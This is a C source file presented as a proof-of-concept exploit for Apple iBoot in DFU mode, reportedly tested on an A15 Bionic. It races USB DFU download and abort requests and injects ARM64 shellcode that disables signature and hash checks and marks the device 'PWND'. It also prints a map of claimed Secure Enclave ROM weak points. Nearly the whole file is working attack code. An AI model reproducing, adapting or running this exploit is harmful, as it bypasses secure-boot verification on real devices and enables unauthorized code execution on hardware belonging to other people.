#define _POSIX_C_SOURCE 200809L
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <errno.h>
#include <libusb-1.0/libusb.h>

#define APPLE_VID           0x05ac
#define DFU_PID             0x1227
#define IBOOT_BASE          0x86ba00000ULL
#define IBOOT_DFU_BUF       0x2006500ULL
#define IBOOT_JTBL_BASE     0x86bb2be5cULL
#define IBOOT_JTBL_TBL      0x86bb2c0a8ULL
#define IBOOT_PAYLOAD_EXEC  0x86bab9388ULL
#define IBOOT_BOOT_BNE      0x86ba70720ULL
#define IBOOT_BOOT_TGT      0x86ba70740ULL
#define IBOOT_SIG_CBZ       0x86bab8b60ULL
#define IBOOT_HASH_ENTRY    0x86bb1cdb0ULL
#define IBOOT_USB_SERIAL    0x86bdf6200ULL

#define SEPROM_BASE         0x0ULL
#define SEPROM_JTBL_0       0x0028f4ULL
#define SEPROM_JTBL_1       0x006384ULL
#define SEPROM_JTBL_2       0x006cccULL
#define SEPROM_JTBL_3       0x009710ULL
#define SEPROM_JTBL_4       0x00cdFcULL
#define SEPROM_JTBL_5       0x010e6cULL
#define SEPROM_JTBL_6       0x014038ULL
#define SEPROM_JTBL_7       0x024654ULL
#define SEPROM_JTBL_8       0x024850ULL
#define SEPROM_JTBL_9       0x0249bcULL
#define SEPROM_VECTTBL      0x01e780ULL
#define SEPROM_LOOP_A       0x0035e4ULL
#define SEPROM_LOOP_B       0x0048b4ULL
#define SEPROM_MBOX_TX      0x5d080000ULL
#define SEPROM_MBOX_RX      0x5d040000ULL
#define SEPROM_AES          0x5c100000ULL
#define NOP32               0x1f2003d5UL
#define RET32               0xd65f03c0UL
#define RETAB32             0xd65f0fffUL
#define MOV_W0_1            0x52800020UL
#define DFU_DNLOAD          1
#define DFU_GETSTATUS       3
#define DFU_CLRSTATUS       4
#define DFU_ABORT           6
#define DFU_WLEN            0x800
#define DFU_TIMEOUT_MS      2000
#define GETSTATUS_LEN       6
#define DFU_STATE_DNLOAD    2

typedef struct {
    libusb_device_handle *dev;
    libusb_context       *ctx;
    volatile int          stop;
    volatile int          aborts;
    volatile int          won;
} racestate;
static size_t emitmov64(uint8_t *buf, size_t off, int reg, uint64_t val)
{
    int sh;
    for (sh = 0; sh < 4; sh++) {
        uint16_t chunk = (uint16_t)((val >> (sh * 16)) & 0xffff);
        uint32_t ins;
        if (sh == 0) {
            ins = 0xd2800000u | (uint32_t)reg | ((uint32_t)chunk << 5);
        } else {
            ins = 0xf2800000u | (uint32_t)reg | ((uint32_t)chunk << 5) |
                  ((uint32_t)sh << 21);
        }
        memcpy(buf + off, &ins, 4);
        off += 4;
    }
    return off;
}
static size_t emitwrite32(uint8_t *buf, size_t off, uint64_t addr, uint32_t val)
{
    uint32_t ins;
    uint16_t lo = (uint16_t)(val & 0xffff);
    uint16_t hi = (uint16_t)((val >> 16) & 0xffff);

    off = emitmov64(buf, off, 0, addr);

    ins = 0xd2800001u | ((uint32_t)lo << 5);
    memcpy(buf + off, &ins, 4); off += 4;

    if (hi) {
        ins = 0xf2a00001u | ((uint32_t)hi << 5);
        memcpy(buf + off, &ins, 4); off += 4;
    }

    ins = 0xb9000001u;
    memcpy(buf + off, &ins, 4); off += 4;
    return off;
}
static size_t emitwrite64(uint8_t *buf, size_t off, uint64_t addr, uint64_t val)
{
    uint32_t ins;
    off = emitmov64(buf, off, 0, addr);
    off = emitmov64(buf, off, 1, val);
    ins = 0xf9000001u;
    memcpy(buf + off, &ins, 4); off += 4;
    return off;
}
static uint32_t makebuncond(uint64_t src, uint64_t tgt)
{
    int64_t imm = ((int64_t)tgt - (int64_t)src) / 4;
    return 0x14000000u | (uint32_t)(imm & 0x3ffffffu);
}
static size_t buildsc(uint8_t *buf, size_t bufsz)
{
    size_t off = 0;
    uint32_t ins;
    memset(buf, 0, bufsz);
    off = emitwrite32(buf, off, IBOOT_BOOT_BNE,
                      makebuncond(IBOOT_BOOT_BNE, IBOOT_BOOT_TGT));
    off = emitwrite32(buf, off, IBOOT_SIG_CBZ, NOP32);
    off = emitwrite32(buf, off, IBOOT_HASH_ENTRY, (uint32_t)MOV_W0_1);
    off = emitwrite32(buf, off, IBOOT_HASH_ENTRY + 4, (uint32_t)RETAB32);
    off = emitwrite64(buf, off, IBOOT_USB_SERIAL,
                      0x63615b3a444e5750ULL);
    off = emitwrite64(buf, off, IBOOT_USB_SERIAL + 8,
                      0x00005d6e77703274ULL);
    ins = (uint32_t)RET32;
    memcpy(buf + off, &ins, 4); off += 4;
    return off;
}
static void LIBUSB_CALL abortcb(struct libusb_transfer *xfr)
{
    racestate *rs = (racestate *)xfr->user_data;
    rs->aborts++;
    free(xfr->buffer);
    libusb_free_transfer(xfr);
}
static void *aborter(void *arg)
{
    racestate *rs = (racestate *)arg;
    struct timeval tv = { 0, 150 };
    while (!rs->stop && !rs->won) {
        struct libusb_transfer *xfr = libusb_alloc_transfer(0);
        if (!xfr) { usleep(100); continue; }
        unsigned char *setup = malloc(LIBUSB_CONTROL_SETUP_SIZE);
        if (!setup) { libusb_free_transfer(xfr); usleep(100); continue; }
        libusb_fill_control_setup(setup, 0x21, DFU_ABORT, 0, 0, 0);
        libusb_fill_control_transfer(xfr, rs->dev, setup, abortcb, rs, 3);
        xfr->flags = LIBUSB_TRANSFER_FREE_BUFFER;
        libusb_lock_events(rs->ctx);
        libusb_submit_transfer(xfr);
        libusb_unlock_events(rs->ctx);
        libusb_handle_events_timeout_completed(rs->ctx, &tv, NULL);
        usleep(80);
    }
    return NULL;
}

static int sendctl(libusb_device_handle *dev, uint8_t reqtype, uint8_t req,
                   uint16_t val, uint16_t idx,
                   uint8_t *data, uint16_t len, unsigned int ms)
{
    return libusb_control_transfer(dev, reqtype, req, val, idx, data, len, ms);
}

static int getstatus(libusb_device_handle *dev, uint8_t *st)
{
    return sendctl(dev, 0xa1, DFU_GETSTATUS, 0, 0, st, GETSTATUS_LEN, 200);
}

static void resetstate(libusb_device_handle *dev)
{
    sendctl(dev, 0x21, DFU_ABORT, 0, 0, NULL, 0, 200);
}

static int race(libusb_context *ctx, libusb_device_handle *dev,
                const uint8_t *sc, size_t sclen, int maxiters)
{
    uint8_t dnbuf[DFU_WLEN];
    memset(dnbuf, 0x41, sizeof(dnbuf));
    if (sclen > sizeof(dnbuf)) sclen = sizeof(dnbuf);
    memcpy(dnbuf, sc, sclen);
    racestate rs;
    memset(&rs, 0, sizeof(rs));
    rs.dev = dev;
    rs.ctx = ctx;
    pthread_t tid;
    pthread_create(&tid, NULL, aborter, &rs);
    int won = 0;
    uint8_t st[GETSTATUS_LEN];
    int iter;

    for (iter = 0; iter < maxiters && !won; iter++) {
        int rc = sendctl(dev, 0x21, DFU_DNLOAD, 0, 0,
                         dnbuf, (uint16_t)sizeof(dnbuf), DFU_TIMEOUT_MS);

        if ((iter & 0x3f) == 0)
            printf("iter %d rc=%d aborts=%d\n", iter, rc, rs.aborts);

        int rc2 = getstatus(dev, st);
        if (rc2 < 0) {
            printf("iter %d usb drop rc2=%d race won ;)\n", iter, rc2);
            rs.won = 1;
            won = 1;
            break;
        }

        if (rc2 == GETSTATUS_LEN && st[4] != DFU_STATE_DNLOAD)
            resetstate(dev);

        usleep(400);
    }

    rs.stop = 1;
    pthread_join(tid, NULL);
    printf("race done iters=%d aborts=%d won=%d\n", iter, rs.aborts, won);
    return won;
}

static libusb_device_handle *opendev(libusb_context *ctx)
{
    libusb_device_handle *dev =
        libusb_open_device_with_vid_pid(ctx, APPLE_VID, DFU_PID);
    if (!dev) return NULL;
    libusb_set_auto_detach_kernel_driver(dev, 1);
    if (libusb_kernel_driver_active(dev, 0) == 1)
        libusb_detach_kernel_driver(dev, 0);
    if (libusb_claim_interface(dev, 0) != 0) {
        libusb_close(dev);
        return NULL;
    }
    return dev;
}

static void printinfo(libusb_device_handle *dev)
{
    unsigned char serial[256] = {0};
    struct libusb_device_descriptor desc;
    libusb_device *d = libusb_get_device(dev);
    libusb_get_device_descriptor(d, &desc);
    libusb_get_string_descriptor_ascii(dev, desc.iSerialNumber,
                                        serial, sizeof(serial));
    printf("device vid=%04x pid=%04x serial=%s\n",
           desc.idVendor, desc.idProduct, serial);
}

static int verify(libusb_context *ctx)
{
    libusb_device_handle *dev = opendev(ctx);
    if (!dev) {
        printf("verify: device not found after race\n");
        return 0;
    }
    unsigned char serial[256] = {0};
    struct libusb_device_descriptor desc;
    libusb_device *d = libusb_get_device(dev);
    libusb_get_device_descriptor(d, &desc);
    libusb_get_string_descriptor_ascii(dev, desc.iSerialNumber,
                                        serial, sizeof(serial));
    printf("serial after race: %s\n", serial);
    int pwnd = strstr((char *)serial, "PWND") != NULL;
    libusb_release_interface(dev, 0);
    libusb_close(dev);
    return pwnd;
}

static void printsepinfo(void)
{
    printf("\nsep vuln map:\n");
    printf("  vuln seprom1 jtbl br sites (no pac):\n");
    printf("    0x%06llx  0x%06llx  0x%06llx  0x%06llx  0x%06llx\n",
           (unsigned long long)SEPROM_JTBL_0,
           (unsigned long long)SEPROM_JTBL_1,
           (unsigned long long)SEPROM_JTBL_2,
           (unsigned long long)SEPROM_JTBL_3,
           (unsigned long long)SEPROM_JTBL_4);
    printf("    0x%06llx  0x%06llx  0x%06llx  0x%06llx  0x%06llx\n",
           (unsigned long long)SEPROM_JTBL_5,
           (unsigned long long)SEPROM_JTBL_6,
           (unsigned long long)SEPROM_JTBL_7,
           (unsigned long long)SEPROM_JTBL_8,
           (unsigned long long)SEPROM_JTBL_9);
    printf("  vuln seprom2 unprotected ret (no pacibsp): 109 sites\n");
    printf("  vuln seprom3 mbox mmio:\n");
    printf("    tx  0x%08llx\n", (unsigned long long)SEPROM_MBOX_TX);
    printf("    rx  0x%08llx\n", (unsigned long long)SEPROM_MBOX_RX);
    printf("    aes 0x%08llx\n", (unsigned long long)SEPROM_AES);
    printf("  vuln seprom4 vecttbl inline code at 0x%06llx\n",
           (unsigned long long)SEPROM_VECTTBL);
    printf("  vuln seprom5 loop candidates 0x%06llx  0x%06llx\n",
           (unsigned long long)SEPROM_LOOP_A,
           (unsigned long long)SEPROM_LOOP_B);
}

int main(int argc, char *argv[])
{
    int maxiters = 5000;
    if (argc > 1) maxiters = atoi(argv[1]);
    printf("poc: iboot dfu jtbl and sep vuln map\n");
    printf("i tested on A15 Bionic\n");
    printf("iboot findings:\n");
    printf("  dfu buf:     0x%016llx\n",
           (unsigned long long)IBOOT_DFU_BUF);
    printf("  jtbl base:   0x%016llx\n",
           (unsigned long long)IBOOT_JTBL_BASE);
    printf("  jtbl table:  0x%016llx\n",
           (unsigned long long)IBOOT_JTBL_TBL);
    printf("  exec fn:     0x%016llx\n",
           (unsigned long long)IBOOT_PAYLOAD_EXEC);

    printsepinfo();
    printf("\nbuilding shellcode...\n");
    uint8_t sc[512];
    size_t sclen = buildsc(sc, sizeof(sc));
    printf("shellcode: %zu bytes\n", sclen);

    libusb_context *ctx = NULL;
    if (libusb_init(&ctx) != 0) {
        fprintf(stderr, "libusb init failed\n");
        return 1;
    }
    printf("looking for dfu device 05ac:1227...\n");
    libusb_device_handle *dev = opendev(ctx);
    if (!dev) {
        fprintf(stderr, "device not found. put device in dfu mode first.\n");
        libusb_exit(ctx);
        return 1;
    }
    printinfo(dev);
    printf("\nrunning race %d iters...\n", maxiters);
    int won = race(ctx, dev, sc, sclen, maxiters);
    libusb_release_interface(dev, 0);
    libusb_close(dev);

    if (won) {
        printf("waiting 3s for shellcode exec...\n");
        sleep(3);
        if (verify(ctx))
            printf("pwnd confirmed\n");
        else
            printf("pwnd not in serial, shellcode may still have run\n");
    } else {
        printf("race didn't worked\n");
    }

    libusb_exit(ctx);
    return won ? 0 : 1;
}